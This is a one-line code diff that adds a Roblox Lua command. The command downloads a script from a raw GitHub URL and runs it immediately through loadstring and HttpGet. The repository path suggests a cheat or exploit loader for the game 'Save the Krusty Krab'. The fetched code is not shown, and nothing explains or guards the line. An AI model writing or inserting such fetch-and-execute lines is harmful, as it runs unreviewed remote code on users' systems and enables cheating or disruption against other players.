@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/save-the-krusty-krab-spam0-celqwui9ii9ivb.lua"))()
